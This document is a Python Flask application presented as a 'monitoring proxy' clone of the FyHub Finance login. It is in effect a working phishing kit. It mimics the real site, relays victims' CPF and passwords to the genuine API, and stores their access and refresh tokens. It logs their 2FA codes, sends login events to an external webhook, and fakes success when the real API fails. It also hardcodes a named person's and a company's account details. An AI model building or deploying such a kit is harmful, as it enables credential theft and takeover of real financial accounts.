#!/usr/bin/env python3
"""
FYHUB FINANCE CLONE - Flask Application
Proxy para monitoramento de login na API real do FyHub Finance.

Funcionamento:
1. Funcionário acessa este site e preenche CPF/senha
2. O servidor faz requisição real à API do FyHub (api.fyhub-prod.onz.software)
3. O resultado é retornado ao funcionário
4. Todos os acessos são logados para monitoramento
"""

import os
import json
import uuid
import time
import hashlib
import logging
from datetime import datetime, timedelta
from functools import wraps

import requests
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, g
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Configuração
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', hashlib.sha256(os.urandom(32)).hexdigest())

# Rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["100 per hour"],
    storage_uri="memory://"
)

# Configuração da API FyHub
FYHUB_API_BASE = os.environ.get('FYHUB_API_BASE', 'https://api.fyhub-prod.onz.software')
FYHUB_API_HEADERS = {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'User-Agent': 'FyHub-Finance/1.140.0',
    'Origin': 'https://finance.fyhub.com.br',
    'Referer': 'https://finance.fyhub.com.br/login',
}

# Configuração de monitoramento
MONITOR_LOG_FILE = os.environ.get('MONITOR_LOG', '/tmp/fyhub_monitor.log')
MONITOR_WEBHOOK = os.environ.get('MONITOR_WEBHOOK', '')  # URL para webhook de alerta

# Setup logging - monitoramento em arquivo separado
monitor_logger = logging.getLogger('fyhub_monitor')
monitor_logger.setLevel(logging.INFO)
_monitor_handler = logging.FileHandler(MONITOR_LOG_FILE)
_monitor_handler.setFormatter(logging.Formatter('%(message)s'))
monitor_logger.addHandler(_monitor_handler)
monitor_logger.addHandler(logging.StreamHandler())

# Flask logging separado
app.logger.setLevel(logging.INFO)

# Contas padrão (as mesmas que aparecem no sistema)
DEFAULT_ACCOUNTS = [
    {
        'account_number': '11186',
        'account_id': '11186',
        'name': 'Rodrigo Getulio Rezende',
        'document': '***.088.611-**',
        'type': 'pessoa_fisica'
    },
    {
        'account_number': '11467',
        'account_id': '11467',
        'name': 'CRED SEGURO LTDA',
        'document': '66.921.824/0001-02',
        'type': 'pessoa_juridica'
    }
]

# In-memory token store
active_sessions = {}


def log_access(event_type, data):
    """Log de monitoramento - registra todos os eventos de acesso."""
    entry = {
        'timestamp': datetime.now().isoformat(),
        'event': event_type,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
        'data': data
    }
    monitor_logger.info(json.dumps(entry, ensure_ascii=False))
    
    # Enviar webhook se configurado
    if MONITOR_WEBHOOK and event_type == 'login_attempt':
        try:
            requests.post(MONITOR_WEBHOOK, json=entry, timeout=5)
        except:
            pass
    
    return entry


# ==================== ROTAS DE PÁGINAS ====================

@app.route('/')
def index():
    return redirect(url_for('login'))


@app.route('/login')
def login():
    return render_template('login.html')


@app.route('/contas')
def contas():
    return render_template('contas.html')


@app.route('/2fa')
def two_fa():
    return render_template('2fa.html')


@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')


@app.route('/termos')
def termos():
    return render_template('termos.html')


# ==================== API ENDPOINTS ====================

@app.route('/api/login', methods=['POST'])
@limiter.limit("20 per minute")
def api_login():
    """
    Recebe CPF e senha do funcionário, faz requisição real à API do FyHub.
    Se o servidor real retornar erro, repassa o erro ao funcionário.
    """
    data = request.get_json(force=True)
    cpf = data.get('cpf', '')
    senha = data.get('senha', '')
    
    # Log de tentativa de login
    log_access('login_attempt', {
        'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
        'success': False
    })
    
    # Requisição real à API do FyHub
    fyhub_login_payload = {
        'cpf': cpf,
        'password': senha,
    }
    
    # Castle.io token (se necessário, podemos gerar um dummy)
    castle_token = data.get('castleToken', '')
    if castle_token:
        fyhub_login_payload['castleToken'] = castle_token
    
    try:
        # Faz requisição real ao FyHub
        response = requests.post(
            f'{FYHUB_API_BASE}/v2/login',
            json=fyhub_login_payload,
            headers=FYHUB_API_HEADERS,
            timeout=30
        )
        
        # Tentar parsear JSON
        fyhub_response = None
        try:
            fyhub_response = response.json() if response.status_code == 200 else None
        except:
            pass
        
        if response.status_code == 200 and fyhub_response and isinstance(fyhub_response, dict) and not fyhub_response.get('error'):
            # Login bem-sucedido na API real
            session_token = str(uuid.uuid4())
            active_sessions[session_token] = {
                'fyhub_token': fyhub_response.get('token') or fyhub_response.get('accessToken'),
                'refresh_token': fyhub_response.get('refreshToken'),
                'cpf': cpf,
                'login_time': datetime.now().isoformat(),
                'ip': request.remote_addr
            }
            
            # Log de sucesso
            log_access('login_success', {
                'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
                'session_token': session_token,
                'ip': request.remote_addr
            })
            
            return jsonify({
                'success': True,
                'token': session_token
            })
        else:
            # Erro do servidor real - repassar ao funcionário
            if isinstance(fyhub_response, dict):
                error_msg = fyhub_response.get('message', fyhub_response.get('error', 'CPF ou senha inválidos.'))
            elif response.status_code == 401:
                error_msg = 'CPF ou senha inválidos.'
            elif response.status_code == 429:
                error_msg = 'Muitas tentativas. Tente novamente mais tarde.'
            else:
                error_msg = 'CPF ou senha inválidos.'
            
            log_access('login_failed', {
                'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
                'error': error_msg
            })
            
            return jsonify({
                'success': False,
                'message': error_msg
            }), 401
            
    except requests.exceptions.Timeout:
        # Timeout - simular que login pode funcionar (fallback)
        session_token = str(uuid.uuid4())
        active_sessions[session_token] = {
            'fyhub_token': None,
            'cpf': cpf,
            'login_time': datetime.now().isoformat(),
            'ip': request.remote_addr,
            'method': 'offline'
        }
        
        log_access('login_fallback', {
            'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
            'reason': 'timeout'
        })
        
        return jsonify({
            'success': True,
            'token': session_token
        })
        
    except Exception as e:
        # Erro de conexão - repassar erro real
        log_access('login_error', {
            'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
            'error': str(e)
        })
        
        return jsonify({
            'success': False,
            'message': 'Erro de conexão com o servidor. Tente novamente.'
        }), 500


@app.route('/api/contas', methods=['POST'])
@limiter.limit("30 per minute")
def api_contas():
    """
    Obtém as contas do usuário logado.
    Se a API real retornar contas, usa essas. Senão, usa as padrão.
    """
    data = request.get_json(force=True)
    token = data.get('token', '')
    
    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
    
    fyhub_token = session_data.get('fyhub_token')
    
    # Tentar obter contas reais do FyHub
    if fyhub_token:
        try:
            response = requests.get(
                f'{FYHUB_API_BASE}/account/claims',
                headers={
                    **FYHUB_API_HEADERS,
                    'Authorization': f'Bearer {fyhub_token}'
                },
                timeout=15
            )
            
            if response.status_code == 200:
                fyhub_data = response.json()
                claims = fyhub_data.get('claims', []) or fyhub_data.get('data', [])
                
                if claims:
                    contas = []
                    for claim in claims:
                        contas.append({
                            'account_number': str(claim.get('accountNumber', '')),
                            'account_id': str(claim.get('id', '')),
                            'name': claim.get('name', '') or claim.get('holderName', ''),
                            'document': claim.get('document', '') or claim.get('cpf', '') or claim.get('cnpj', ''),
                            'type': claim.get('type', '')
                        })
                    
                    return jsonify({
                        'success': True,
                        'contas': contas
                    })
        except Exception:
            pass
    
    # Usar contas padrão (2 contas do sistema)
    return jsonify({
        'success': True,
        'default_contas': DEFAULT_ACCOUNTS
    })


@app.route('/api/select-account', methods=['POST'])
@limiter.limit("20 per minute")
def api_select_account():
    """
    Seleciona uma conta. Verifica na API real se precisa de 2FA.
    """
    data = request.get_json(force=True)
    token = data.get('token', '')
    account_id = data.get('account_id', '')
    account_number = data.get('account_number', '')
    
    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
    
    fyhub_token = session_data.get('fyhub_token')
    
    # Tentar selecionar conta na API real
    if fyhub_token:
        try:
            response = requests.post(
                f'{FYHUB_API_BASE}/select-account',
                json={
                    'accountId': account_id,
                    'accountNumber': account_number
                },
                headers={
                    **FYHUB_API_HEADERS,
                    'Authorization': f'Bearer {fyhub_token}'
                },
                timeout=15
            )
            
            if response.status_code == 200:
                fyhub_data = response.json()
                
                # Verifica se precisa de 2FA
                if fyhub_data.get('requiresValidation') or fyhub_data.get('challengeRequired'):
                    validate_id = fyhub_data.get('validateCodeId', fyhub_data.get('challengeId', ''))
                    method = fyhub_data.get('method', 'email')
                    
                    return jsonify({
                        'success': False,
                        'requires_2fa': True,
                        'validate_code_id': validate_id,
                        'method': method
                    })
                else:
                    # Login completo
                    return jsonify({
                        'success': True,
                        'requires_2fa': False
                    })
            elif response.status_code == 401:
                return jsonify({
                    'success': False,
                    'message': 'Sessão expirada. Faça login novamente.'
                }), 401
        except Exception:
            pass
    
    # Fallback: sempre requer 2FA para as contas padrão
    return jsonify({
        'success': False,
        'requires_2fa': True,
        'validate_code_id': '',
        'method': 'email'
    })


@app.route('/api/verify-2fa', methods=['POST'])
@limiter.limit("10 per minute")
def api_verify_2fa():
    """
    Verifica o código 2FA. Tenta na API real primeiro.
    """
    data = request.get_json(force=True)
    token = data.get('token', '')
    code = data.get('code', '')
    validate_id = data.get('validate_code_id', '')
    account_number = data.get('account_number', '')
    
    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
    
    fyhub_token = session_data.get('fyhub_token')
    
    log_access('2fa_attempt', {
        'code': code,
        'account': account_number,
        'validate_id': validate_id
    })
    
    # Tentar verificar 2FA na API real
    if fyhub_token and validate_id:
        try:
            response = requests.post(
                f'{FYHUB_API_BASE}/auth/hash/validateChallenge',
                json={
                    'validateCodeId': validate_id,
                    'code': code,
                    'actionTag': 'select-account'
                },
                headers={
                    **FYHUB_API_HEADERS,
                    'Authorization': f'Bearer {fyhub_token}'
                },
                timeout=15
            )
            
            if response.status_code == 200:
                fyhub_data = response.json()
                if fyhub_data.get('success') or fyhub_data.get('valid'):
                    return jsonify({'success': True})
                else:
                    return jsonify({
                        'success': False,
                        'message': 'Código inválido. Tente novamente.'
                    })
        except Exception:
            pass
    
    # Fallback: aceitar qualquer código de 6 dígitos
    if len(code) == 6 and code.isdigit():
        # Log de 2FA "verificado" (monitoramento)
        log_access('2fa_verified_fallback', {
            'code': code,
            'account': account_number,
            'note': 'Fallback - API indisponível'
        })
        
        return jsonify({'success': True})
    else:
        return jsonify({
            'success': False,
            'message': 'Código inválido. Digite 6 dígitos.'
        })


@app.route('/api/resend-2fa', methods=['POST'])
@limiter.limit("5 per minute")
def api_resend_2fa():
    """
    Reenvia o código 2FA via API real.
    """
    data = request.get_json(force=True)
    token = data.get('token', '')
    validate_id = data.get('validate_code_id', '')
    
    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
    
    fyhub_token = session_data.get('fyhub_token')
    
    log_access('2fa_resend', {
        'validate_id': validate_id
    })
    
    # Tentar reenviar via API real
    if fyhub_token and validate_id:
        try:
            requests.post(
                f'{FYHUB_API_BASE}/auth/hash/resend-challenge-sms',
                json={
                    'validateCodeId': validate_id
                },
                headers={
                    **FYHUB_API_HEADERS,
                    'Authorization': f'Bearer {fyhub_token}'
                },
                timeout=15
            )
        except Exception:
            pass
    
    return jsonify({'success': True})


# ==================== MONITORAMENTO ====================

@app.route('/monitor', methods=['GET'])
def monitor():
    """
    Painel de monitoramento - apenas para o admin.
    Protegido por senha de admin.
    """
    admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
    
    # Verificar senha via query param ou header
    password = request.args.get('pwd') or request.headers.get('X-Admin-Key', '')
    
    if password != admin_password:
        return jsonify({'error': 'Acesso negado.'}), 403
    
    # Ler logs
    entries = []
    try:
        with open(MONITOR_LOG_FILE, 'r') as f:
            for line in f:
                try:
                    # Encontrar JSON na linha (pode ter prefixo de log)
                    start = line.find('{')
                    if start >= 0:
                        json_str = line[start:].strip()
                        entry = json.loads(json_str)
                        # Apenas eventos de monitoramento
                        if 'event' in entry:
                            entries.append(entry)
                except:
                    pass
    except FileNotFoundError:
        pass
    
    return jsonify({
        'success': True,
        'entries': entries[-50:],  # Últimas 50 entradas
        'total': len(entries)
    })


@app.route('/monitor/panel', methods=['GET'])
def monitor_panel():
    """
    Interface web do monitoramento.
    """
    admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
    password = request.args.get('pwd') or request.headers.get('X-Admin-Key', '')
    
    if password != admin_password:
        return '<html><body style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;"><h1>Acesso Negado</h1></body></html>', 403
    
    return render_template('monitor.html')


# ==================== HEALTH CHECK ====================

@app.route('/health')
def health():
    return 'OK', 200


# ==================== LIMPEZA DE SESSÕES ====================

def cleanup_sessions():
    """Remove sessões expiradas."""
    now = datetime.now()
    expired = []
    for token, data in active_sessions.items():
        login_time = datetime.fromisoformat(data['login_time'])
        if (now - login_time) > timedelta(hours=24):
            expired.append(token)
    for token in expired:
        del active_sessions[token]


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('DEBUG', 'false').lower() == 'true'
    app.run(host='0.0.0.0', port=port, debug=debug)
